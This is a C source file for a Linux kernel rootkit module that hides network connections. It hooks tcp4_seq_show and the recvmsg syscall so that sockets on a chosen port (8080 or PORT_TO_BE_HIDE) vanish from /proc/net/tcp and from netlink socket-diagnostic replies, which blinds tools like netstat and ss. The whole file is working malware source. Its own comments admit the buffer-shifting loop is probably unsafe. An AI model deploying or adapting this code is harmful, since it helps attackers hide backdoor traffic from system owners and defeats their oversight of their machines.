//
// Created by sciver on 10/19/22.
//

#include "hide_port.h"

// #include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
// #include <linux/kallsyms.h>
#include <linux/tcp.h>

asmlinkage ssize_t (*real_sys_recvmsg)(const struct pt_regs *regs);
/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

/* This is our hook function for tcp4_seq_show */
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(8080);

    if (v != SEQ_START_TOKEN)
    {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport)
        {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
                   ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}


/* This is our hook function for tcp4_seq_show */
asmlinkage long fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *sock_info;
    long ret;
    unsigned short port = htons(PORT_TO_BE_HIDE);

    if (v != SEQ_START_TOKEN)
    {
        sock_info = (struct inet_sock *)v;
        if (port == sock_info->inet_sport || port == sock_info->inet_dport)
        {
            printk(KERN_DEBUG "rootkit: detected tcp4_seq_show: sport: %d, dport: %d\n",
                   ntohs(sock_info->inet_sport), ntohs(sock_info->inet_dport));
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}


/* Function that checks whether specified netlink message contains data to be masked */
static bool data_should_be_masked(struct nlmsghdr *nlh)
{
    struct inet_diag_msg *r;
    // int port;
    // struct port_node *node = NULL;

    /* NLMSG_DATA: Given a netlink header structure, this macro returns
	   a pointer to the ancilliary data which it contains */
    r = NLMSG_DATA(nlh);

    // 未判断协议类型
    if (ntohs(r->id.idiag_sport) == PORT_TO_BE_HIDE || ntohs(r->id.idiag_dport) == PORT_TO_BE_HIDE)
    {
        printk(KERN_DEBUG "rootkit: detected recvmsg: sport: %d dport:%d\n",
               ntohs(r->id.idiag_sport),ntohs(r->id.idiag_dport));
        return true;
    }
    return false;
}

ssize_t fake_sys_recvmsg(const struct pt_regs *regs)
{
    // int sockfd, struct user_msghdr __user *msg, unsigned flags
    long ret;
    struct nlmsghdr *nlh, *nlh_kernel;
    void *nlh_user_ptr;
    long count;
    char *stream;
    int offset;
    int i;
    struct user_msghdr msg;
    struct iovec *msg_iov;
    /* Call original `recvmsg` syscall */
    ret = real_sys_recvmsg(regs);

    /* Some error occured. Don't do anything. */
    if (ret <= 0)
        return ret;

    /* Extract netlink message header from message */
    // nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);
    if (copy_from_user(&msg, (void *)regs->si, sizeof(struct user_msghdr)))
    {
        printk(KERN_INFO "rootkit: copy_from_user fail. si");
        return ret;
    }

    msg_iov = msg.msg_iov;

    if (copy_from_user(&nlh_user_ptr, &msg_iov->iov_base, sizeof(void *)))
    {
        printk(KERN_INFO "rootkit: copy_from_user fail. iov_base");
        return ret;
    }

    nlh_kernel = (struct nlmsghdr *)kmalloc(ret, GFP_KERNEL);

    if (copy_from_user(nlh_kernel, nlh_user_ptr, ret))
    {
        printk(KERN_INFO "rootkit: copy_from_user fail. nlh_user_ptr");
        kfree(nlh_kernel);
        return ret;
    }

    nlh = nlh_kernel;

    /* Number of bytes remaining in message stream */
    count = ret;

    // 下面的代码很可能有安全问题
    /* NLMSG_OK: This macro will return true if a netlink message was received. It
	   essentially checks whether it's safe to parse the netlink message (if indeed
	   is a netlink message) using the other NLMSG_* macros. */
    while (NLMSG_OK(nlh, count))
    {

        if (!data_should_be_masked(nlh))
        {
            /* NLMSG_NEXT: Many netlink protocols have request messages that result
			   in multiple response messages. In these cases, multiple responses will
			   be copied into the `msg` buffer. This macro can be used to walk the
			   chain of responses. Returns NULL in the event the message is the last
			   in the chain for the given buffer. */
            nlh = NLMSG_NEXT(nlh, count);
            continue;
        }

        stream = (char *)nlh;

        /* NLMSG_ALIGN: This macro accepts the length of a netlink message and rounds it
		   up to the nearest NLMSG_ALIGNTO boundary. It returns the rounded length. */
        offset = NLMSG_ALIGN((nlh)->nlmsg_len);

        /* Copy remaining entries over the data to be masked */
        for (i = 0; i < count; i++)
        {
            stream[i] = stream[i + offset];
        }

        /* Adjust the data length */
        ret -= offset;
    }

    if (copy_to_user_mcsafe(nlh_user_ptr, nlh_kernel, ret))
    {
        printk(KERN_INFO "rootkit: copy_to_user_mcsafe fail.");
    }

    kfree(nlh_kernel);
    return ret;
}

